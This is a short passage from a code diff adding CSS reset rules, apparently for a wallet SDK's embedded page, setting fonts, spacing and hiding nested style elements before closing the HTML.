+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+    line-height: 1
+  }
+
+  .-cbwsdk-css-reset [class*=container] {
+    margin: 0;
+    padding: 0
+  }
+
+  .-cbwsdk-css-reset style {
+    display: none
+  }
+</style>
+
+</html>
